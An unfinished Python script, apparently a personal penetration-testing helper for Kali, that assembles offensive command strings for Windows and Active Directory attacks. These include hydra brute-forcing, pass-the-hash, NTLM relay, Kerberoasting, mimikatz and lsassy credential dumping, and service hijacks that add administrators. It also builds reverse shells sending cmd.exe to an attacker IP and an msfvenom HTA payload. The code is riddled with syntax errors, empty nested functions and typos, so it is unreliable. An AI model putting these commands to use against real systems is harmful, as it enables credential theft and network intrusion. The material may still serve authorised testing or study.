#!/bin/env python3
import sqlite3, logging, socket, os, sys
from threading import Thread
from concurrent.futures import Future
from concurrent.future import ThreadPoolExecutor
from subprocess import run,PIPE,Popen

def create_logger():
	logger = logging.getLogger(__name__)
	c_handler = logging.StreamHandler()
	f_handler = logging.FileHandler('/home/kali/pentest.log')
	c_handler.setLevel(logging.DEBUG)
	f_handler.setLevel(logging.DEBUG)
	log_format = logging.Formatter('%(levelname)s | %(asctime)s | %(name)s | %(message)s')	
	f_handler.setFormatter(log_format)
	logger.addHandler(c_handler)
	logger.addHandler(f_handler)

def call_with_future(fn, future, args, kwargs):
	try:
		result = fn(*args, **kwargs)
		future.set_result(result)
	except Exception as exc:
			future.set_exception(exc)
def threadit(fn):
	def wrapper(*args, **kwargs):
		future = Future()
		t = threading.Thread(target=call_with_future,args=(fn, future, args, kwargs))
		t.daemon=True
		self.log(f'Starting: t.name')
		t.start()
		#t.join()
		return future
	return wrapper
	#fut.result() # will block until result is computed 

def threadmany(fn, thread_count):
	tp = ThreadPoolExecutor(thread_count)
	def wrapper(*args, **kwargs):
		return tp.submit(fn,*args,**kwargs)
	return wrapper
	#tp.shutdown() # after done to terminate parallel tasks

class Pentester():
	
	def __init__(self):
		self.logger = create_logger()
		self.db_path = None
		self.connection: Optional[sqlite3.Connection] = None
		self.cursor: Optional[sqlite3.Cursor] = None
		self.RHOST = None
		self.RHOSTS = None
		self.LHOST = run(['ifconfig | grep tun0 -A 1 | grep inet | cut -b 14-27'.split(),shell=True)
		self.LPORT = None
		self.RPORT = None
		self.RPROTOCOL = None
		self.USERNAME = None
		self._USERNAME = '/usr/share/wordlists/dirb/others/names.txt'
		self.PASSWORD = None
		self._PASSWORD = '/usr/share/wordlists/rockyou.txt '
		self.HASH = None
		self.HASHES = None
		self.DOMAIN = None
		self.FQDN = None
		self.SHARE = None
		self.HOME = '/home/kali'
		self.cwd = os.getcwd()
		
	def log(msg):
		self.logger.debug(msg)
		
	def logg(msg):
		self.log('---------------------------')
		self.log(msg)
		self.log('---------------------------')
		
	def connect(self) -> bool
		try:
			self.connection = sqlite3.connect('pentester.db')
			self.connection.row_factory = sqlite3.Row
			self.cursor = self.connection.cursor()
			self.log('Connection successful')
			return True
		except sqlite3.Error as e:
			self.logger.exception(e)
			return False

	def examples(self):
		command = f'ls /usr/share/doc/python3-impacket/examples'
	
	def _sqlite3(self):
		def initialize_db(self):
			#table = '''create table credentials (name VARCHAR(255), password VARCHARR(255), hash VARCHAR(255), description VARCHAR(255));'''
			#cursor.execute(table)
			#cursor.commit()
			#table = '''create table credentials (name VARCHAR(255), password VARCHARR(255), hash VARCHAR(255), description VARCHAR(255));'''
			
		def add_credential(self):
			 self.cursor.execute("INSERT INTO credentials VALUES (1, 'cakes',800,10 )")
		def create_table(self, cursor):
			#table = '''create table student (name VARCHAR(255), CLASS VARCHARR(255), section VARCHAR(255));'''
			#cursor.execute(table)
			#cursor.commit()
		def sqlite_delete(self, args*, kwargs**):
			#cursor.execute('delete from student where score < 15')
			#cursor.commit()
		def sqlite_update(self,args*,kwargs**):
			#cursor.execute('update employee set income = 5000 where age <25;')
			#cursor.commit()
			#cursor.execute('''update students set sname = "sraven" where SID = 1')
		def sqlite_select(self,args*, kwargs**):
			#cursor.execute('select * from student')

	def transfer(self, file):
		def iwr(self, file):
			command = f'iwr -uri http://{self.LHOST}:8000/{file} -Outfile {file}'
			print(command)
			
		def smbsrv(self):
			command = 'impacket-smbserver -smb2support -username kali -password kali share .'
			Popen(command.split())
		def webdavsrv(self):
			command = 'wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/'
			Popen(command.split())
		def pysrv(self):
			command = 'python3 -m http.server'
		def smbtransfer(self,file):
			command = f'net use \\{self.LHOST}\share /user:kali kali'
			command2 = f'copy-item {file} \\{self.LHOST}:445\\share\{file}'
			print(command)
			print(command2)
		def nctransfer(self,file):
			command = f'nc.exe {self.LHOST} {self.LPORT} -w 3 < {file}'
			command2 = f'nc -lvp {self.LPORT} > FiletoDownload'
			print(command)
			print(command2)

	def home_network(self):
		def remove_network_interface(self, name):
			command = f'sudo ip link delete {name}'
   			self.log(command)
      			Popen(command.split())

	def powerview(self):
		def powerview_commands(self):
			commands = '''Get-NetUser \n Get-NetComputer \n Get-DomainShare (-CheckShareAccess) \n Get-NetUser -SPN | select serviceprincipalname \n Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl'''
			for c in commands:
				print(c)
	
		def powerview_getSPNtickets(self):
			command = 'Request-SPNTicket -SPN "<SPN>" -Format Hashcat #SPN Ex: MSSQLSvc/mgmt.domain.local' # Get Kerberoast hash of user'
			print(command)
	
		def powerview_getallSPNtickets(self):
			command = 'Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv \kerberoast.csv -NoTypeInformation # Powerview: Get all Kerberoast hashes'
			print(command)

	def wpscan(self):
		command = 'wpscan --url http://"$RHOST"/wp/wp-login.php --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads=50'
		self.log(command)
		Popen(command.split())

	def rpcclient(self):
		command = 'rpcclient -U "" $RHOST "$@"}' # -queryusergroups <RID>,-querygroup <Group RID>,-queryuser <RID>'

	def dns(self):
		def dnsrecon(self):
			command = f'dnsrecon -d {self.RHOST} /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.md'
			command2 = f'dnsrecon {self.DOMAIN} -t axfr'
			print(command)
			print(command2)
		
	def smb(self):

		def cme_checkNull(self):
			command = f'crackmpackexec smb {self.RHOST} -u "" -p "" --users'
			self.log(command)
			
		def enum4linux(self):
			command = f'enum4linux -a {self.RHOST}'
			self.log(command)
			Popen(command.split())
			
		def cme_spray(self, rhost = None):
			command = f'crackmapexec smb {self.RHOSTS}'
			self.log(command)
			Popen(command.split()

		def cme_auto(self):
			command = f'crackmapexec smb {self.RHOST} -u {self.USERNAME} -p {self.PASSWORD} -H {self.HASH} -d corp.com --continue-on-succes --shares --lists'
   			print(command)
      			self.log(command)
		def smb_pth(self):
			command = f'smbclient \\{self.RHOST}\\secrets -U Administrator --pw-nt-hash $HASH'

		def net_view(self):
			command = 'net view \\dc01 /all'
		def smbclient(self):
			command = f'smbclient //server/share --directory path/to/directory -c "get file.txt"'
			
	 def ldap(self)
		def ldapsearch(self):
			command = f'ldapsearch -h self.RHOST} -p {self.PASSWORD} -x -s base'
			self.log(command)

	def password_cracking(self):
		def hydra_brute(self):
			command = f'hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt -vV {self.RHOST} {self.RPROTOCOL}' 
   			self.log(command)
		def hydra_gethttp(self):
			command = f'hydra -l admin -P /usr/share/wordlists/rockyou.txt {self.RHOST} http-get /index.php/'
			self.log(command)
		def hydra_httppostform(self):
			command = f'hydra -l {self.USERNAME} -P {self._PASSWORD} t {self.RHOST} http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid'
			self.log(command)

	##################### Lateral Movement #############################

	def ps(self):
		def impacket_psexec(self):
			command = f'{}/{}:{}@{}'.format(self.DOMAIN,self.USERNAME,self.PASSWORD,self.RHOST)
			self.log(command)
			command2 = f'impacket-psexec -hashes 00000000000000000000000000000000:{} {}@{}'.format(self.HASH,self.USERNAME,self.PASSWORD)
	def wmi(self):
		def impacket_wmiexec(self):
			command = f'impacket-wmiexec -hashes 00000000000000000000000000000000:{} {}@{}'.format(self.HASH,self.USERNAME,self.PASSWORD)
	def winrm(self):
		def evil_winrm(self):
			command = f'evil-winrm -i {self.RHOST}' -u {self.USERNAME} -H {self.HASH}'

	def ntlm_relay(self):
		def impacket_ntlmrelayx(self):
			command = f'impacket-ntlmrelayx --no-http-server -smb2support -t {self.RHOST} -c "powershell -enc JABjAGwAaQBlAG5...."' #dir \\192.168.119.2\test -> on tgt machine to catch hash'
			self.log(command)
	def mssql(self):
		def impacket_mssqlclient(self):
			command = 'impacket-mssqlclient {}:{}@{} -windows-auth'.format(self.USERNAME,self.SHARE,self.RHOST) # $1 = share name
			print(command)

	def msql(self):
		def msql_default_check(self):
			command = 'msql -u 'root' -p 'root' -h {self.RHOSTS} -P {self.RPORT}
			self.log(command)

	def SPNs(self):
		def impacket_GetUserSPNs(self):
			'''Kerberoasting'''
			command = f'impacket-GetUserSPNs -request -dc-ip {self.RHOST} {self.FQDN}/{self.USERNAME}:{self.PASSWORD}'
			self.log(command)
			command2 = f'impacket-GetUserSPNs -no-preauth "ASREP_User" -userfile {self.USERNAME} -dc-host {self.RHOST} {self.FQDN}/{self.USERNAME}:{self.PASSWORD}'
			self.log(command2)

	def tunnels(self):
		def ligolo(self):
			'''magic IP (local agent IP) = 240.0.0.1'''
			
			start_command = f'sudo ip tuntap add user `hostname` mode tun ligolo;sudo ip link set ligolo up;./proxy -selfcert'
			self.log(start_command)
			client_command = f'./agent -connect {self.LHOST}:11601 -ignore-cert &";echo "sudo ip route add _IP_ dev ligolo'
			self.log(client_command)
			listeners_command = f'listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:4444 --tcp";echo "listener_add --addr 0.0.0.0:9000 --to 127.0.0.1:4444 --tcp'
			self.log(listeners_command)

	def mimikatz(self):
		command = '.\mimikatz.exe \n privilege::debug \n sekurlsa::logonpasswords \n token::elevate \n lsadump::sam'
		self.log(command)

	def get_usernames(self):
		def nmap_kerb(self):
			command = f'nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm={self.DOMAIN}'
   			self.log(command)
      		def kerbrute_users(self):
			command = f'kerbrute bruteuser -d {self.domain} {self._PASSWORDS} [self.USERNAME}'
			self.log(command)

	def lsas(self):
		def lsassy(self):
			command = f'lsassy -d (self.DOMAIN} u self.USERNAME} -p {self.PASSWORD} {self.RHOST}'
			self.log(command)

		def lsassy_users(self):
			command = f'lsassy -d {self.DOMAIN} -u {self.USERNAME} -p {self.PASSWORD} -H {self.HASH} {self.RHOST} --users'
			self.log(command)
   		def lsassy_procdump(self):
			command = f'lsassy -d {self.DOMAIN}  -u{self.USERNAME} -p{self.PASSWORD} {self.FQDN} -m procdump -O procdump_path=/opt/Sysinternals/procdump.exe'
			self.log(command)
		def lsassy_dumpert(self):
			command = f'lsassy_dumpert -d {self.DOMAIN} -u {self.USERNAME} -p{self.PASSWORD} dc01.hackn.lab -m dumpert -O dumpert_path=/opt/dumpert.exe'
			self.log(command)

		def lsassy_dumpertdll(self):
			command = f'lsassy -d {self.DOMAIN} -u {self.USERNAME} -p{self.PASSWORD} {self.FQDN}  -m dumpertdll -O dumpertdll_path=/opt/dumpert.dll'

		def lsassy_ticketharvesting(self):
			'''harvesting kerberos tickets'''
			command = f''lsassy -d {self.DOMAIN} -u {self.USERNAME} -p{self.PASSWORD} {self.FQDN} -K "/tmp/kerberos_tickets"
		def lsassy_local_creds(self):
			command = f'lsassy -u $username -p $password server01.hackn.lab' ## Local user
		def lsassy_domain_creds(self):
			command = f'lsassy -d hackn.lab -u $username -p $password server01.hackn.lab' ## Domain user
		def lsassy_pth(self):
			command = f'lsassy -d hackn.lab -u jsnow -H aad3b435b51404eeaad3b435b51404ee:38046f6aa4f7283f9a6b7e1575452109 server01.hackn.lab'
	def PowerUp(self):
		self.log('. .\PowerUp.ps1 ; Invoke-AllChecks')
	def DLL_Hijacking(self):
		def PowerUp(self):
			command = f'Write-HijackDll -DllPath "C:\\Temp\\wlbsctrl.dll"'
			command2='Find-PathDLLHijack PowerUp.ps1'

	def UnquotedServicePath(self):
		def PowerUp(self):
			command = f'echo Invoke-AllChecks;echo Get-ServiceUnquoted;echo Write-ServiceBinary -Name "service" -Path HijackPatch (will add john:Password123!);echo Write-ServiceBinary -Name "service" -Path C:\\\WebServer\\Abyss.exe -Command "net localgroup Administrators user /add";echo sc stop service;echo sc start service'
		def PowerShell(self):
			command = f'#powershell -nop -exec bypass -c "(New-Object Net.WebClient).DownloadFile("http://192.168.0.114:8080/common.exe", "C:\\Program Files\\Unquoted Path Service\\common.exe")"'
	def GetNPUsers(self):
		local_command = f'python3 GetNPUsers.py htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt'
		domain_command =f'python3 GetNPUsers.py test.local/ -dc-ip "$1" -usersfile usernames.txt -format hashcat -outputfile getnpusers_hashes.txt'

	def Kerberoasting(self):
		def Rubeus(self):
			c1='Rubeus.exe kerberoast' 
			c2='.\Rubeus.exe kerberoast /outfile:hashes.kerberoast'
			c3='.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast' #Specific user
			c4='.\Rubeus.exe kerberoast /ldapfilter:"admincount=1" /nowrap' #Get of admins
		
	def Runas(self):
		def run_runas(self):
			command = 'runas /netonly /user:active.htb\svc_tgs cmd'
			command2 = 'Invoke-RunasCs svc_mssql trustno1 "cmd /c C:\xampp\htdocs\uploads\nc.exe -e cmd.exe 192.168.45.227 53'
			
		def call_remote_binary(self):
			command1 = 'cmdkey /list'
			#Then you can use runas with the /savecred options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.
			command2 = f'runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe'
			command2 = f'runas /savecred /user:Administrator "cmd.exe /k whoami"'

		def creds_call_remote_binary(self):
			command = f'C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"'
	def sharphound(self):
		command = 'Import-Module ./SharpHound.ps1 \n invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice'
		command = '.\Sharphound.ps1';echo Invoke-BloodHound -CollectionMethod All -OutputDirectory 'C:\TEMP\' -OutputPrefix audit'
		self.log(command)
	def bloodhound(self):
		command = 'sudo neo4j start\necho bloodhound'
		self.log(command)

	def PrintSpoofer(self):
		command = '.\PrintSpoofer64.exe -i -c cmd'
		self.log(command)

	def msfvenom(self):
		def html_payload(self):
			command = f'msfvenom -p windows/shell_reverse_tcp LHOST={self.HOST} LPORT={self.LPORT} -f hta-psh> shell.hta'
			self.log(command)
	
'''
try:
   
    # Connect to DB and create a cursor
    connection = sqlite3.connect('pentester.db')
    cursor = connection.cursor()
    cursor.execute('' CREATE TABLE ports
         (FIND INT PRIMARY KEY     NOT NULL,
         FNAME           TEXT    NOT NULL,
         COST            INT     NOT NULL,
         WEIGHT        INT);
         '')
    connection.execute("INSERT INTO hotel VALUES (1, 'cakes',800,10 )")
    print('DB Init')
 
    # Write a query and execute it with cursor
    query = 'select sqlite_version();'
    cursor.execute(query)
 
    # Fetch and output result
    result = cursor.fetchall()
    print('SQLite Version is {}'.format(result))
 
    # Close the cursor
    cursor.close()
 
# Handle errors
except sqlite3.Error as error:
    print('Error occurred - ', error)
 
# Close DB Connection irrespective of success
# or failure
finally:
   
    if sqliteConnection:
        sqliteConnection.close()
        print('SQLite Connection closed')
'''


################## Banner Grabber #############################
'''
import socket

target = "example.com"
port = 80

def banner_grab(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        banner = s.recv(1024)
        print("[+] Banner: " + banner.decode().strip())
        s.close()
    except Exception as e:
        print("[-] Error: " + str(e))

banner_grab(target, port)
'''
################ Scrape email Addresses ###################
'''
import requests
from bs4 import BeautifulSoup
import re

url = "https://example.com"

def scrape_emails(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    emails = re.findall(r'\S+@\S+', soup.get_text())
    return set(emails)

email_set = scrape_emails(url)
for email in email_set:
    print("[+] Found Email: " + email)
'''
